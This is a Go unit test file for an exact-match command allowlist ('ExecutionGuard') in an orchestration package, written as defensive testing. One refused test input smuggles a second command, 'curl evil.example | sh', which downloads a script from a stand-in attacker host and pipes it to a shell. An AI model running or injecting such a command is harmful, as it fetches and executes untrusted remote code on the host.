// Copyright (c) 2025 Jeremy Hahn
// Copyright (c) 2025 Automate The Things, LLC
//
// This file is part of go-quicbaas.
//
// go-quicbaas is dual-licensed:
//
// 1. GNU Affero General Public License v3.0 (AGPL-3.0)
//    See LICENSE file or visit https://www.gnu.org/licenses/agpl-3.0.html
//
// 2. Commercial License
//    Contact licensing@automatethethings.com for commercial licensing options.

package orchestration

import (
	"errors"
	"strings"
	"testing"
)

// TestExecutionGuard_CommandsMatchExactly: the allowlist grammar is exact
// string equality — one flag more, one metacharacter, one space of
// difference is a different command and is refused with the knob named.
func TestExecutionGuard_CommandsMatchExactly(t *testing.T) {
	t.Parallel()
	g := guardAllowing(t, "make test", "make lint")

	for _, ok := range []string{"make test", "  make test  ", "make lint"} {
		if err := g.CheckCommand("c", ok); err != nil {
			t.Fatalf("allowlisted command %q refused: %v", ok, err)
		}
	}
	for _, bad := range []string{
		"make test ./...",
		"make test; curl evil.example | sh",
		"make",
		"MAKE TEST",
		"",
	} {
		err := g.CheckCommand("c", bad)
		var refused *CommandRefusedError
		if !errors.As(err, &refused) {
			t.Fatalf("command %q: got %T (%v), want CommandRefusedError", bad, err, err)
		}
		if !errors.Is(err, ErrCommandRefused) {
			t.Fatalf("command %q: must unwrap to ErrCommandRefused", bad)
		}
		if refused.Name != "c" || !strings.Contains(err.Error(), "orchestration.verification_commands") {
			t.Fatalf("command %q: the refusal must name the criterion and the knob: %v", bad, err)
		}
		if bad != "" && strings.Contains(err.Error(), bad) {
			t.Fatalf("command %q: the refused command must not be rendered", bad)
		}
	}
}

// TestExecutionGuard_ZeroValueRefusesEverything: a node with no configured
// allowlist runs nothing — fail closed is the meaning of the zero value, not
// an accident of nil maps.
func TestExecutionGuard_ZeroValueRefusesEverything(t *testing.T) {
	t.Parallel()
	var g ExecutionGuard
	if err := g.CheckCommand("c", "make test"); !errors.Is(err, ErrCommandRefused) {
		t.Fatalf("the zero guard allowed a command: %v", err)
	}
}

// TestNewExecutionGuard_RefusesEmptyEntries: an empty allowlist entry is a
// typo that would allow the empty command.
func TestNewExecutionGuard_RefusesEmptyEntries(t *testing.T) {
	t.Parallel()
	_, err := NewExecutionGuard([]string{"make test", "  "})
	var cfgErr *ExecutionGuardConfigError
	if !errors.As(err, &cfgErr) || !errors.Is(err, ErrExecutionGuardConfig) {
		t.Fatalf("an empty command entry was accepted: %v", err)
	}
	if !strings.Contains(err.Error(), "orchestration.verification_commands") {
		t.Fatalf("the config error must name the knob: %v", err)
	}
	if _, err := NewExecutionGuard(nil); err != nil {
		t.Fatalf("an empty allowlist is a valid, everything-refusing guard: %v", err)
	}
}
